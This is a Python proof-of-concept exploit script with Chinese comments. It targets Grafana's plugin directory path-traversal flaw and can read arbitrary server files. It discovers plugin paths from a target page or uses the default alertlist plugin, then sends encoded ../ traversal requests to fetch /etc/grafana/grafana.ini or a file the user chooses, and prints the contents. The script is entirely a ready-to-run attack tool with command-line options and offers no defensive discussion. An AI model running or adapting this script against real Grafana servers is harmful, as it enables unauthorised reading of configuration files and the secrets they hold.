import requests
from urllib.parse import quote
import re
import warnings
import optparse

warnings.filterwarnings('ignore')

class POC(object):
    def __init__(self,path,id):
        print(path,id)
        self.headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"}
        self.timeout=30
        self.proxy={"http":"http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}
        self.path=quote("/#/../../../../../../../../../{}".format(path))
        if id=="0":
            self.id=0 #是否使用默认插件路径检测
        else:
            self.id=1

        if path=="0":
            self.check=0 #是否使用默认payload检测
        else:
            self.check=1
        self.default="/public/plugins/alertlist" #默认插件路径
        self.configpath="/%23/../..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/grafana/grafana.ini"
        self.urlpluginpath=[]

    def sendexp(self,url):
        url=url.rstrip("/")
        try:
            rqt=requests.get(url=url,headers=self.headers,timeout=self.timeout,verify=False)
            if self.id!=0:
                pluginurllist=re.findall('"baseUrl":".*?"',rqt.text)
                for pluginpath in pluginurllist:
                    path=url+"/"+pluginpath.split(":")[-1].lstrip('"').rstrip('"').replace("/app/","/").replace("/panel/","/")
                    self.urlpluginpath.append(path)
            else:
                self.urlpluginpath.append(url+self.default)


            for pluginurl in self.urlpluginpath:
                if self.check == 0:
                    payloadurl=pluginurl+self.configpath
                else:
                    payloadurl=pluginurl+self.path
                rqtx=requests.get(url=payloadurl,headers=self.headers,timeout=self.timeout,verify=False)
                if "<html" not in rqtx.text and rqtx.status_code==200:
                    print("[+] Found pluginpath:{}".format(payloadurl))
                    print(rqtx.text)
                    break
                else:
                    print("[-] pluginurl:{} Can not".format(payloadurl))
        except Exception as error:
            print(error)
if __name__ == '__main__':
    parser=optparse.OptionParser()
    parser.add_option("-c",dest="id",help="默认检测/自定义路径")
    parser.add_option("-p",dest="check",help="是否使用默认插件路径检测/目标插件路径搜索检测")
    parser.add_option("-u",dest="url",help="要检测的url")
    option,args=parser.parse_args()
    if option.url and option.id and option.check:
        if option.id=="0":
            obj=POC(option.check,"0")
            obj.sendexp(option.url)
        else:
            obj=POC(option.check,"1")
            obj.sendexp(option.url)
    else:
        help_="python grafana_read.py -u <url> -c 0 -p 0 #默认插件路径默认payload检测\n" \
              "python grafana_read.py -u <url> -c 1 -p 0 #页面搜索插件路径检测\n" \
              "python grafana_read.py -u <url> -c 0 -p /etc/hosts #默认插件路径自定义文件读取\n" \
              "python grafana_read.py -u <url> -c 1 -p /etc/hosts #页面搜索插件路径自定义文件读取"
        parser.print_help()
        print(help_)